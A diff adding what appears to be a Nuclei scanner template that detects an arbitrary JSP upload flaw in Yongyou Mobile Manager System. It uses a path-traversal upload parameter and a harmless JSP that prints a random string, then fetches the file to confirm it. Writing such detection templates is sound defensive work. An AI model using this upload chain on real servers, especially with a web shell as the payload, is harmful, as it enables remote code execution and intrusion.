@@ -1,0 +1,54 @@
+id: yongyou-mobsm-upload-anyfile
+info:
+  name: Yongyou Mobile Manager System Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    Arbitrary file upload vulnerability in Yongyou Mobile Manager System allowing potential execution of uploaded JSP files.
+
+variables:
+  random_content: '{{rand_text_alphanumeric(12)}}'
+  random_name: '{{rand_text_alphanumeric(8)}}'
+  boundary: '{{rand_text_alphanumeric(15)}}'
+
+flow: http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - '{{BaseURL}}/mobsm/common/upload?category=../webapps/nc_web/maupload/apk'
+    headers:
+      Content-Type: 'multipart/form-data; boundary=----WebKitFormBoundary{{boundary}}'
+    body: |-
+      ------WebKitFormBoundary{{boundary}}
+      Content-Disposition: form-data; name="file"; filename="{{random_name}}.jsp"
+      
+      <% out.println("{{random_content}}");%>
+      ------WebKitFormBoundary{{boundary}}--
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - '/webapps/nc_web/maupload/apk/visitor(.*?)\.jsp'
+    extractors:
+      - type: regex
+        part: body
+        internal: true
+        group: 1
+        regex:
+          - '/webapps/nc_web/maupload/apk/visitor(.*?)\.jsp'
+
+  - id: validate-file
+    method: GET
+    path:
+      - '{{BaseURL}}/maupload/apk/visitor/{{regex_extract_1}}.jsp'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '{{random_content}}'
